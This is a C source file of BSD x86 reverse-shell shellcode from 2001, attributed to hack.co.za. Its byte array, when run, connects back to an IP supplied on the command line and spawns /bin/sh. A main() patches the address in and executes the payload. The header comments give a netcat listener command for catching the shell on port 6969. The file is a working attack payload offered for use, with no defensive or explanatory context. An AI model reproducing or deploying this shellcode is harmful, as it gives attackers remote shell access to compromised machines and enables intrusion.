/* reverse-portshell *BSD shellcode by noir       */
/* local usage: ./reverse-shell 192.168.2.33      */
/* remote:  nc -n -v -v -l -p 6969                */ 
/* listen on 6969/tcp				  */
/* noir@gsu.linux.org.tr			  */


char shellcode[] = 
{
  0x31,0xc9,0x51,0x41,   
  0x51,0x41,0x51,0x51,
  0x31,0xc0,0xb0,0x61,
  0xcd,0x80,0x89,0x07,
  0x31,0xc9,0x88,0x4f, 
  0x04,0xc6,0x47,0x05,
  0x02,0xc7,0x47,0x08,
  0xc0,0xa8,0x01,0x45, //ipaddr
  0x66,0xc7,0x47,0x06,   
  0x1b,0x39,0x6a,0x10,
  0x8d,0x47,0x04,0x50,  
  0x8b,0x07,0x50,0x50,
  0x31,0xc0,0xb0,0x62,   
  0xcd,0x80,0x31,0xc9,
  0x51,0x8b,0x07,0x50,   
  0x50,0x31,0xc0,0xb0,
  0x5a,0xcd,0x80,0x41,   
  0x83,0xf9,0x03,0x75,
  0xef,0x31,0xc9,0x51,   
  0x51,0x31,0xc0,0xb0,
  0x17,0xcd,0x80,0xeb,   
  0x23,0x5b,0x89,0x1f,
  0x31,0xc9,0x88,0x4b,   
  0x07,0x89,0x4f,0x04,
  0x51,0x8d,0x07,0x50,   
  0x8b,0x07,0x50,0x50,
  0x31,0xc0,0xb0,0x3b,   
  0xcd,0x80,0x31,0xc9,
  0x51,0x51,0x31,0xc0,   
  0xb0,0x01,0xcd,0x80,
  0xe8,0xd8,0xff,0xff,   
  0xff,0x2f,0x62,0x69,
  0x6e,0x2f,0x73,0x68,   
  0x41
};


int main(int argc, char ** argv)
{
  void (*f) (void);
  unsigned int d;

  if(!argv[0])
    exit(0);

  d = inet_addr(argv[1]);
  printf("IP: %lx shellcode len: %d\n", d, strlen(shellcode));


  shellcode[28] = d & 0xff ;
  shellcode[29] = (d >> 8) & 0xff;
  shellcode[30] = (d >> 16) & 0xff;
  shellcode[31] = (d >> 24) & 0xff;


  f =  (void *) shellcode;
  f();
}
/*                   www.hack.co.za  [20 march 2001]*/